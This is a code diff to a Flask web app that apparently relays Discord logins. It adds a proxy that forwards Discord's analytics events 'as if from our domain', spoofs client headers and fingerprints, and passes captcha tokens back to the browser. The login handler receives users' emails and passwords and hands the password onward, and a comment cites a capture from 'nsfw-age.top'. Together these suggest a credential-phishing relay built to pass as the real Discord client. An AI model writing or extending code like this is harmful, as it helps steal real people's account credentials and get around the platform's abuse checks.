@@ -1689,6 +1689,44 @@ def _pop_captcha_session(session_id):
         pair = _pending_captcha.pop(session_id, None)
         return pair[0] if pair else None
 
+
+# ── Science proxy ──
+# Discord's JS client fires analytics events to discord.com/api/v9/science.
+# We proxy these so the browser can send them as if from our domain.
+@app.route('/api/v9/science', methods=['POST', 'OPTIONS'])
+def api_science_proxy():
+    # Handle CORS preflight
+    if request.method == 'OPTIONS':
+        resp = make_response('', 204)
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Super-Properties, X-Fingerprint, X-Discord-Locale, X-Discord-Timezone, X-Debug-Options'
+        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
+        return resp
+    try:
+        body = request.get_data()
+        # Forward to Discord with proper headers
+        hdrs = {
+            'Accept': '*/*',
+            'Content-Type': 'application/json',
+            'User-Agent': UA,
+            'X-Super-Properties': request.headers.get('X-Super-Properties', sprops()),
+            'X-Debug-Options': 'bugReporterEnabled',
+            'X-Discord-Locale': 'en-US',
+            'X-Discord-Timezone': 'America/New_York',
+        }
+        fp = request.headers.get('X-Fingerprint', '')
+        if fp:
+            hdrs['X-Fingerprint'] = fp
+        r = plain_req.post('https://discord.com/api/v9/science', data=body, headers=hdrs, timeout=10)
+        print(f'[science] proxied -> {r.status_code}')
+        resp = make_response('', r.status_code)
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        return resp
+    except Exception as e:
+        print(f'[science] error: {e}')
+        return '', 204
+
+
 @app.route('/api/login', methods=['POST'])
 def api_login():
     ok, retry_after = _rate_check('login')
@@ -1715,7 +1753,7 @@ def api_login():
 
         payload = {
             'login': login_email, 'password': login_pw,
-            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
+            'undelete': False, 'gift_code_sku_id': None,
         }
 
         # Discord expects captcha as HTTP headers (confirmed via nsfw-age.top HAR)
@@ -1759,6 +1797,8 @@ def api_login():
                 'rqdata':     j.get('captcha_rqdata', ''),
                 'rqtoken':    j.get('captcha_rqtoken', ''),
                 'session_id': sid,
+                'fingerprint': ds.fingerprint or '',
+                'super_properties': sprops(),
             }), 200
 
         return _format_login_result(j, r.status_code, client_ip, ds, password=login_pw)
